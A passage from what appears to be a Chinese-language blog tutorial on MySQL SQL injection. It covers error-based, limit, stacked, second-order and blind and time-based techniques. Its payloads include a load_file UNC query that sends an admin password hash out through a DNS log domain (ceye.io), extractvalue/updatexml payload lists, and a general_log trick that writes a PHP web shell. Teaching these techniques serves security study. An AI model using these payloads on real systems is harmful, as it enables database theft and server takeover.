<code>count(*)</code></p><p><strong>在查询数据的时候，首先查看该虚拟表中是否存在该分组，如果存在那么计数值加1，不存在则新建该分组</strong></p><p>同理我们根据<code>floor(rand(0)*2)</code>进行分组—–这里要注意<code>floor(rand(0)*2)</code>执行之后是有规律的返回0或者1。</p><p>根据之前rand的顺序—011011011,我们来梳理一下为什么会报错</p><ul><li><p>第一次计算执行一次产生0,表中不存在任何数据,然后开始插入</p></li><li><p>插入的时候会进行第二次计算,所以在执行一次产生1插入</p></li><li><p>第三次计算产生1因为第二次产生了1所以本次就无需在执行一次计算,直接在原来的基础上加1就可以,不会在进行一次计算</p></li><li><p>第四次产生0,原来的表中没有0所以要进行插入操作,会再一次计算产生1.所以会再次产生一个分组,<strong>注意是产生一个分组,不是单纯的产生一个数值</strong></p><p>此时此刻就报错了。因为我们已经有了一个1分组了。注意是有了一个1分组了。在添加一个1分组会报错。</p></li></ul><p>注意：</p><p>sql语句在执行之后建立虚表分两种情况：</p><p>1、表中没有对应的列，执行一次查询，一次插入，<code>floor(rand(0)*2)</code>会被执行两次。</p><p>2、表中有对应的列，执行一次查询，一次插入，<code>floor(rand(0)*2)</code>只会被执行一次。</p><p>主键重复的最少前提就是虚拟表中要有三条数据才会产生重复,也就是group by执行至少三次,也就是对应的group by的表要有至少三条数据</p></li></ul></li><li><p>几何函数</p><p>geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()等函数</p><p>这些函数报错原理大多都相同，都是不满足参数需求而导致的报错。</p></li><li><p>DNSlog外带配合报错注入</p><p>作为攻击者，提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，我们只要能获得DNS的日志，就得到了想要的值。所以我们需要有一个自己的域名，然后在域名商处配置一条NS记录，然后我们在NS服务器上面获取DNS日志即可。用ceye.io这个平台，这个平台就集成了Dnslog的功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;mysql.php?id&#x3D;1 union select 1,2,load_file(CONCAT(&#39;\\&#39;,(SELECT hex(pass) </span><br><span class="line">FROM test.test_user WHERE name&#x3D;&#39;admin&#39; LIMIT 1),&#39;.mysql.steady.ceye.io\abc&#39;))</span><br></pre></td></tr></table></figure><p>load_file函数在Linux下是无法用来做dnslog攻击的。</p><p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p><p>\sss.xxx\test\</p><p>这也就解释了为什么CONCAT()函数拼接了4个<code>\</code>了，因为转义的原因，4个就变<code>\</code>成了2个<code>\</code>，目的就是利用UNC路径。</p><p>tips：</p><p>因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据的 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。</span><br></pre></td></tr></table></figure></li></ul><h6 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;  and extractvalue(1,concat(0x7e,user(),0x7e))<span class="comment">#</span></span><br><span class="line">-1&#x27;  and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))<span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;  and updatexml(1,concat(0x7e,user(),0x7e),1)#</span></span><br><span class="line"><span class="string">-1&#x27;</span>  <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;  and (select 1 from(select count(),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)#</span></span><br></pre></td></tr></table></figure><h5 id="Limit注入"><a href="#Limit注入" class="headerlink" title="Limit注入"></a>Limit注入</h5><ul><li><p>常用函数</p><ul><li>limit [位置偏移量,]行数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from math limit 1,2;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">+------+-----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from math limit 1,3;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">+------+-----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><ul><li><p>benchmark</p><p>benchmark函数有两个参数，第一个是执行次数，第二个是要测试的函数或者表达式 .</p></li></ul></li><li><p>limit注入</p><ul><li><p>注入点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*from math limit 1,[可控点] </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*from math order by id desc limit 1,2</span><br></pre></td></tr></table></figure><p>limit后面能够拼接的函数只有into和procedure。</p></li><li><p>无order by关键字</p><ul><li><p>使用union联合查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from math order by id desc limit 0,1 union select username from users;</span><br></pre></td></tr></table></figure></li><li><p>报错注入(5.0.0&lt; MySQL &lt;5.6.6版本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *  from math order by id desc limit 0,1  procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure></li><li><p>延时注入(5.0.0&lt; MySQL &lt;5.6.6版本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *  from math order by id desc limit 0,1 procedure analyse(if(substring(version(),1,1)&#x3D;5,benchmark(50000000,encode(&#39;msg&#39;,&#39;by 5 second&#39;)),0),1)</span><br></pre></td></tr></table></figure><p>只能使用BENCHMARK，而不能使用sleep</p></li></ul></li><li><p>有order by关键字</p><p>无法使用union关键字，可尝试盲注或者报错</p><ul><li><p>报错注入(5.0.0&lt; MySQL &lt;5.6.6版本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *  from math order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure></li><li><p>延时注入(5.0.0&lt; MySQL &lt;5.6.6版本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *  from math order by id desc limit 0,1 procedure analyse(if(substring(version(),1,1)&#x3D;5,benchmark(50000000,encode(&#39;msg&#39;,&#39;by 5 second&#39;)),0),1)</span><br></pre></td></tr></table></figure><p>只能使用BENCHMARK，而不能使用sleep</p></li></ul></li></ul></li></ul><h5 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h5><p>定义</p><p>堆叠可以理解为多个sql语句放在一起，一起执行，在mysql命令行中我们的sql语句是以分号分割的，所以我们在sql注入的时候可以考虑，是否可以进行多语句执行注入。例如在mysql中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select  * from  math;select user();</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">|    3 | chengxian |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">+------+-----------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">+----------------+</span><br><span class="line">| user()         |</span><br><span class="line">+----------------+</span><br><span class="line">| root@localhost |</span><br><span class="line">+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>而union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p><p>原理：</p><ul><li><p>mysql_query与mysqli-&gt;multi_query()</p><p>mysql_query() 函数执行一条 MySQL 查询。</p><p>mysqli_multi_query()支持多查询，多查询使用多个分号进行分隔。</p></li><li><p>利用配合日志getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1;set global general_log&#x3D;&#39;on&#39;;set global general_log_file&#x3D;&#39;D:\\wwwroot\\web\\shell.php&#39;;#</span><br><span class="line">id&#x3D;1;select &#39;&lt;?php phpinfo();?&gt;&#39;;#</span><br></pre></td></tr></table></figure></li></ul><h5 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h5><ul><li><p>原理：</p><p>用户第一次输入的数据，经过各种函数处理比如<code>addslashes</code>或者<code>get_magic_quotes_gpc</code>之后，仍然被原封不动的保存在数据库中，即存入了脏数据，当程序从数据库中取出脏数据的时候，进而产生了二次注入。</p></li><li><p>实例：</p><p>sqlib-24</p><p>我们需要先去注册一个用户名为admin’ #的用户，用户名存入数据库，当我们需要修改当前用户的密码的时候，我们直接输入用户名，无须输入密码即可成功修改。</p><p>程序从数据库中取出脏数据后，执行的sql语句就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;$curr_pass&#39;</span><br></pre></td></tr></table></figure></li></ul><h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><ul><li><p>原理：</p><p>指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注。</p><p>盲注分为两类：<br> 　　　1.布尔盲注　布尔很明显Ture跟Fales，也就是说它只会根据你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。<br> 　　　2.时间盲注　界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</p></li><li><p>常用函数</p><h5 id="IF"><a href="#IF" class="headerlink" title="IF()"></a>IF()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF(expr1,expr2,expr3)</span><br></pre></td></tr></table></figure><p>如果 expr1 是TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。</p><h5 id="MID"><a href="#MID" class="headerlink" title="MID()"></a>MID()</h5><p>MID() 函数用于从文本字段中提取字符。</p><p><code>SELECT MID(column_name,start[,length]) FROM table_name;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT MID(&#39;NowaMagic&#39;,1,2);</span><br><span class="line">+----------------------+</span><br><span class="line">| MID(&#39;NowaMagic&#39;,1,2) |</span><br><span class="line">+----------------------+</span><br><span class="line">| No                   |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT MID(&#39;NowaMagic&#39;,1,3);</span><br><span class="line">+----------------------+</span><br><span class="line">| MID(&#39;NowaMagic&#39;,1,3) |</span><br><span class="line">+----------------------+</span><br><span class="line">| Now                  |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT MID(&#39;NowaMagic&#39;,0,3);</span><br><span class="line">+----------------------+</span><br><span class="line">| MID(&#39;NowaMagic&#39;,0,3) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                      |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure><p><strong>substr()</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,3);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,1,3) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| Now                     |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,1,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| N                       |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,2,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,2,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| o                       |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,3,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,3,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| w                       |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,3);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,1,3) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| Now                     |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,2);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,1,2) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| No                      |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,0,2);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,0,2) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                         |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,0,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,0,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                         |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong>case()</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select case 2 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| case 2 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| two                                                        |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select case 1 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| case 1 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| one                                                        |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select case 3 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| case 3 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| more                                                       |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h5 id="ord"><a href="#ord" class="headerlink" title="ord()"></a>ord()</h5><p>ORD() 函数返回字符串第一个字符的 <a href="http://www.nowamagic.net/academy/tag/ASCII">ASCII</a> 值。</p><h5 id="ELT-N-str1-str2-str3-…"><a href="#ELT-N-str1-str2-str3-…" class="headerlink" title="ELT(N,str1,str2,str3,…)"></a>ELT(N,str1,str2,str3,…)</h5><p>如果N =1返回str1，如果N= 2返回str2，等等。返回NULL如果参数的数量小于1或大于N。ELT()是FIELD()的补集。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT ELT(1, &#39;ej&#39;, &#39;Heja&#39;, &#39;hej&#39;, &#39;foo&#39;);</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">| ELT(1, &#39;ej&#39;, &#39;Heja&#39;, &#39;hej&#39;, &#39;foo&#39;)                      |</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">| ej                                                      |</span><br><span class="line">+---------------------------------------------------------+</span><br></pre></td></tr></table></figure></li><li><p>sleep()、BENCHMARK()</p></li><li><p>笛卡尔积</p><p>原理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AxB&#x3D;A和B中每个元素的组合所组成的集合，就是连接表</span><br></pre></td></tr></table></figure><p>具体的方式就是将简单的表查询不断的叠加，使之以指数倍运算量的速度增长，不断增加系统执行 sql 语句的负荷，直到产生攻击者想要的时间延迟，利用系统自带的表和字段来完成攻击。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C;</span><br></pre></td></tr></table></figure><p>根据数据库查询的特点，这句话的意思就是将 A B C 三个表进行笛卡尔积（全排列），并输出 最终的行数。</p><p>实例：</p><p>配合if</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table where id &#x3D; 1 and (if(substr(database(),1,1)&#x3D;&#39; &#39;, select count(*) from information_schema.columns A, information_schema.columns B,information_schema.columns C, null))</span><br></pre></td></tr></table></figure></li><li><p>Get_lock() 加锁机制</p><p>在单数据库的环境下，如果想防止多个线程操作同一个表（多个线程可能分布在不同的机器上），可以使用这种方式，取表名为key，操作前进行加锁，操作结束之后进行释放，这样在多个线程的时候，即保证了单个表的串行操作，又保证了多个不同表的并行操作。</p><p>(1)GET_LOCK有两个参数，一个是key,表示要加锁的字段，另一个是加锁失败后的等待时间(s)，一个客户端对某个字段加锁以后另一个客户端再想对这个字段加锁就会失败，然后就会等待设定好的时间</p><p>(2)当调用 RELEASE_LOCK来释放上面加的锁或客户端断线了，上面的锁才会释放，其它的客户端才能进来。</p><p>原理：</p><p>尝试对一个字段加锁</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(&#39;username&#39;,10);</span><br><span class="line">  +-------------------------+</span><br><span class="line">| get_lock(&#39;username&#39;,10) |</span><br><span class="line">  +-------------------------+</span><br><span class="line">  |                       1 |</span><br><span class="line">  +-------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>尝试开启另一个客户端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(&#39;username&#39;,10);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(&#39;username&#39;,10) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       0 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (10.01 sec)</span><br></pre></td></tr></table></figure><p>实例：</p><p>对有一个字段加锁</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from ctf where flag &#x3D; 1 and get_lock(&#39;username&#39;,1);</span><br></pre></td></tr></table></figure><p>再次加锁(配合if)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from ctf where flag &#x3D; 1 and 1 and if(substr(database(),1,1),get_lock(&#39;username&#39;,5),null);</span><br></pre></td></tr></table></figure><p>限制条件：</p><p>限制条件就是数据库的连接必须是持久连接，我们知道 mysql_connect() 连接数据库后开始查询，然后调用 mysql_close()  关闭与数据库的连接，也就是 web  服务器与数据库服务器连接的生命周期就是整个脚本运行的生命周期，脚本结束连接即断开，但是很明显这里我们要利用的是前一个连接对后一个连接的阻碍作用导致延时，所以这里的连接必须是持久的。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。</p></li><li><p>其他盲注函数–mysql中用regexp是区分大小写的</p><ul><li><p>lpad和rpad函数</p><p>lpad(sourceStr, length, newStr)，将字符串newStr填补到sourceStr左边，直到sourceStr长度达到length。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select lpad(1,5,2);</span><br><span class="line">+-------------+</span><br><span class="line">| lpad(1,5,2) |</span><br><span class="line">+-------------+</span><br><span class="line">| 22221       |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li></ul><p>配合盲注</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select length(lpad(1,(select length(database())),2));</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| length(lpad(1,(select length(database())),2)) |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">|                                             4 |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select lpad(1,(select length(database())),2);</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| lpad(1,(select length(database())),2) |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| 2221                                  |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><ul><li><p>like和regexp:</p><p>Like:</p><p>% : 匹配0个或任意多个字符</p><p>_ : 匹配任意一个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| test       |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>判断第一个字符是否是t</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;t%&#39;;</span><br><span class="line">+----------------------+</span><br><span class="line">| database() like &#39;t%&#39; |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    1 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>判断前两个字符是不是te</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;te%&#39;;</span><br><span class="line">+-----------------------+</span><br><span class="line">| database() like &#39;te%&#39; |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     1 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>判断是否包含es两个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 